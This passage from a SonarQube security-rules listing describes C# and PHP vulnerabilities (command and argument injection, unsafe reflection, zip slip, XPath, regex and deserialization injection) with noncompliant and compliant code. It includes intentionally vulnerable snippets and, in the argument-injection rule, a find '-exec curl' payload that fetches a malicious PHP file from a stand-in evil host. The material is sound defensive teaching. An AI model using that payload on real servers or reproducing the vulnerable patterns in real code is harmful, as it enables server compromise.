<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6350">
              roslyn.sonaranalyzer.security.cs:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920">CVE-2016-9920</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472">CVE-2021-29472</a> </li>
</ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Malicious arguments can result in undesired behavior in the executed command. </li>
  <li> Passing user input to a system command is not necessary. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid constructing system commands from user input when possible. </li>
  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>
  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
using System.Diagnostics;
Process p = new Process();
p.StartInfo.FileName = "/usr/bin/find";
p.StartInfo.ArgumentList.Add(input); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
using System.Diagnostics;
Process p = new Process();
p.StartInfo.FileName = "/usr/bin/find";
if (allowed.Contains(input)) {
  p.StartInfo.ArgumentList.Add(input);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6173">
              roslyn.sonaranalyzer.security.cs:S6173
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to
inspect, load or invoke a component by name.</p>
<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code
execution on the server’s website.</p>
<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the
initial reflection logic to an impactful malicious one.</p>
<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected
code to run. The attacker can use this ability to run arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>
<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted
actions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate their privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or
effects. It assumes the user will give a known name, such as "SepiaEffect".</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public IActionResult Apply(string EffectName)
    {
        var EffectInstance  = Activator.CreateInstance(null, EffectName); // Noncompliant
        object EffectPlugin = EffectInstance.Unwrap();

        if ( ((IEffect)EffectPlugin).ApplyFilter() )
        {
            return Ok();
        }
        else
        {
            return Problem();
        }
    }
}

public interface IEffect
{
    bool ApplyFilter();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    private static readonly string[] EFFECT_ALLOW_LIST = {
        "SepiaEffect",
        "BlackAndWhiteEffect",
        "WaterColorEffect",
        "OilPaintingEffect"
    };

    public IActionResult Apply(string EffectName)
    {
        if (!EFFECT_ALLOW_LIST.Contains(EffectName))
        {
            return BadRequest("Invalid effect name. The effect is not allowed.");
        }

        var EffectInstance  = Activator.CreateInstance(null, EffectName);
        object EffectPlugin = EffectInstance.Unwrap();

        if ( ((IEffect)EffectPlugin).ApplyFilter() )
        {
            return Ok();
        }
        else
        {
            return Problem();
        }
    }
}

public interface IEffect
{
    bool ApplyFilter();
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>
<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/470">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe
  Reflection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6096">
              roslyn.sonaranalyzer.security.cs:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    private static string TargetDirectory = "/example/directory/";

    public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)
    {
        ZipArchiveEntry entry = entriesEnumerator.Current;
        string destinationPath = Path.Combine(TargetDirectory, entry.FullName);

        entry.ExtractToFile(destinationPath);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    private static string TargetDirectory = "/example/directory/";

    public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)
    {
        ZipArchiveEntry entry = entriesEnumerator.Current;
        string destinationPath = Path.Combine(TargetDirectory, entry.FullName);
        string canonicalDestinationPath = Path.GetFullPath(destinationPath);

        if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
        {
            entry.ExtractToFile(canonicalDestinationPath);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol>
  <li> Resolve the canonical path of the file by using methods like <code>System.IO.Path.GetFullPath</code> or
  <code>System.IO.Path.GetFileName</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity
  regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>
</ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>TargetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String TargetDirectory = "/Users/John";

public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)
{
    ZipArchiveEntry entry = entriesEnumerator.Current;
    string canonicalDestinationPath = Path.GetFullPath(TargetDirectory);

    if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
    {
        entry.ExtractToFile(canonicalDestinationPath);
    }
}
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://snyk.io/research/zip-slip-vulnerability">snyk</a> - Zip Slip Vulnerability </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2091">
              roslyn.sonaranalyzer.security.cs:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to XPath injections because untrusted data is concatenated in an XPath query without prior validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult Authenticate(string user, string pass)
    {
        XmlDocument doc = new XmlDocument();

        String expression = "/users/user[@name='" + user + "' and @pass='" + pass + "']";

        return Json(doc.SelectSingleNode(expression) != null);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult Authenticate(string user, string pass)
    {
        XmlDocument doc = new XmlDocument();
        if (!Regex.IsMatch(user, "^[a-zA-Z]+$") || !Regex.IsMatch(pass, "^[a-zA-Z]+$"))
        {
            return BadRequest();
        }

        String expression = "/users/user[@name='" + user + "' and @pass='" + pass + "']";

        return Json(doc.SelectSingleNode(expression) != null);
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Validation</h4>
<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it
in an XPath query.</p>
<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>
<p>Input can be validated in multiple ways:</p>
<ul>
  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>
  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric
  characters.) </li>
  <li> By ensuring user input does not include any XPath metacharacters, such as <code>"</code>, <code>'</code>, <code>/</code>, <code>@</code>,
  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>
</ul>
<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>
<p>In the example, a validation mechanism is applied to untrusted input to ensure it is strictly composed of alphabetic characters.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection">OWASP, XPath Injection
  Prevention Cheat Sheet</a> </li>
  <li> <a href="https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls">Ambionics, XPath Injection
  Section of "Hacking WatchGuard Firewalls'</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/643">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2631">
              phpsecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function lookup(string $data): bool {
  $regex = $_GET["regex"];
  return preg_match($regex, $data); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function lookup(string $data): bool {
  $regex = $_GET["regex"];
  return preg_match(preg_quote($regex), $data);
}
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2">re2</a>.</p>
<p>In the compliant solution, <code>preg_quote</code> escapes metacharacters and escape sequences that could have broken the initially intended
logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5883">
              phpsecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<p>Other standard PHP functions are susceptible to the same vulnerable behavior. Especially, the <code>mail</code> function accepts, as its fifth
argument, parameters that will be appended to the configured mail-sending program command line. This might lead to a similar exploitation
scenario.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$arg=$_GET['file'];
echo "&lt;h1&gt;File search results:&lt;/h1&gt;&lt;br/&gt;";
$cmd=escapeshellcmd('find /tmp/images -iname ' . $arg);
passthru($cmd);
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
$arg=$_GET['arg'];
echo "&lt;h1&gt;Sending test mail.&lt;/h1&gt;&lt;br/&gt;";
mail("mail@example.org", "example subject", "Example", [], $arg);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$arg=$_GET['file'];
echo "&lt;h1&gt;File search results:&lt;/h1&gt;&lt;br/&gt;";
$cmd='find /tmp/images -iname ' . escapeshellarg($arg);
passthru($cmd);
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
$arg=$_GET['arg'];
echo "&lt;h1&gt;Sending test mail.&lt;/h1&gt;&lt;br/&gt;";

$allowed_args_mapping = ["-n","-v"];
if (! in_array($arg, $allowed_args_mapping, true)) {
	$arg = "";
}
mail("mail@example.org", "example subject", "Example", [], $arg);
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>When building a system command from user-submitted data is unavoidable, using the <code>escapeshellarg</code> sanitizing function should be
preferred. It ensures that the provided data will be considered a single argument and prevents the injection of subsequent ones.</p>
<p>It is also important not to combine both <code>escapeshellarg</code> and <code>escapeshellcmd</code>. Indeed, a call to <code>escapeshellcmd</code>
on a complete command line will void any escaping previously added with <code>escapeshellarg</code>.</p>
<p>Therefore, it is impossible to prevent an argument injection issue in the <code>mail</code> function with <code>escapeshellarg</code>. Indeed,
<code>mail</code> internally relies on <code>escapeshellcmd</code> for escaping purposes. In that case, an allowlist of explicitly trusted additional
arguments should be used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://blog.sonarsource.com/roundcube-command-execution-via-email/">Roundcube 1.2.2: Command Execution via Email</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5135">
              phpsecurity:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$cookie = $_COOKIE['session'];
$session = unserialize($session); // Noncompliant

echo $session-&gt;auth ? "OK" : "KO";
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$cookie = $_COOKIE['session'];
list($session, $mac) = explode('|', $cookie, 2);
$hash = hash_hmac("sha256", $session, $KEY);

if (hash_equals($hash, $mac)) {
    $session = unserialize($session);
} else {
    die;
}

echo $session-&gt;auth ? "OK" : "KO";
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
